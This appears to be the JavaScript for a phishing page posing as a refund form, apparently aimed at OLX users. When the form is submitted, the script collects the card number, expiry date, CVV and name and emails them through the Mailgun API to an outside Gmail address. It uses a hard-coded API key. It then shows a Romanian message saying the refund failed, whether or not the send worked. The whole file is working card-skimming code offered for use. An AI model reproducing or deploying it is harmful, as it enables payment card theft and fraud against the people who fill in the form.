const form = document.querySelector("form");

form.addEventListener("submit", (event) => {
  event.preventDefault();

  const cardNumber = document.getElementById("cardNumber").value;
  const expiration = document.getElementById("expiration").value;
  const cvv = document.getElementById("cvv").value;
  const name = document.getElementById("name").value;

  const formData = new FormData();
  formData.append("from", name);
  formData.append("to", "refondingolx2332@gmail.com"); 
  formData.append("subject", "New order from " + name);
  formData.append("text", "Card number: " + cardNumber + "\nExpiration: " + expiration + "\nCVV: " + cvv);

  fetch("https://api.mailgun.net/v3/sandboxfa552cd9d8bb4904b3a4a796116d70f1.mailgun.org/messages", {
    method: "POST",
    headers: {
      Authorization: "Basic" + btoa("api:e47edb5156e90bb5bb5d2c3a10479f0d-6b161b0a-55b699cc"), 
    },
    body: formData,
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error("Network response was not ok");
      }
      alert("Problema la rambursarea banilor. Incearca din nou sau contactati-ne.");
      form.reset();
    })
    .catch((error) => {
      alert("Problema la rambursarea banilor. Incearca din nou sau contactati-ne.");
      console.error("Error:", error);
    });
});
